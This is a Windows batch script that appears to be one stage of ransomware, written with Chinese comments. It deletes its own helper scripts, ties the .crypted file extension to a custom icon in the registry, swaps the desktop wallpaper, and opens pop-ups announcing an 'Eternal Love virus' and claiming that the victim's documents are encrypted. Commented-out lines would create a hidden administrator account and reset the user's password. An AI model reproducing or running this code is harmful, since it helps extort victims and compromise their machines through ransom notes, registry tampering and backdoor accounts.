::@echo off
@del /s /q/ f %~dp0\mail.bat
@del /s /q/ f %~dp0\robot.bat
::关联被hack的文件图标并删除源文件
copy %~dp0\520.ico %WINDIR%\520.ico
@del /s /q/ f %~dp0\520.ico
@assoc .crypted=hack
@ftype hack=
@reg add HKEY_CLASSES_ROOT\hack\DefaultIcon /ve /d "%WINDIR%\520.ico" /f
::更改桌面壁纸
@if not exist %WINDIR%\Web\Wallpaper md %WINDIR%\Web\Wallpaper
@copy %~dp0\123.jpg %WINDIR%\Web\Wallpaper.jpg
@del /s /q /f %~dp0\123.jpg
@reg add "hkcu\control panel\desktop" /v "wallpaper" /d "%WINDIR%\Web\Wallpaper.jpg" /f
::刷新系统
@RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
::拷贝日志到系统盘根目录并删除源文件夹里的日志
copy %~dp0\log.txt %WINDIR%\log.txt
del /s /q/ f %~dp0\log.txt
::net user 加qq123456 123 /add
::net localgroup administrators 加qq123456 /add
::net user %username% 789
rem net user 加qq123456789 /delete
::重启资源管理器
@RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
@RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
::弹出提示
@mshta vbscript:msgbox("恭喜，您中了永恒之爱病毒",6,"系统提示")(window.close)
@mshta vbscript:msgbox("Dear Ooops: 您的电脑已经被黑，桌面上所有文档已经被加密，强烈建议您按照桌面上的提示进行操作，否则可能造成无法挽回的损失；此时，千万不要关闭这个窗口，否则您将进入再次进入系统，不信您可以试试",6,"友情提示:You have already been hacked")(window.close)
::shutdown -l
exit>nul
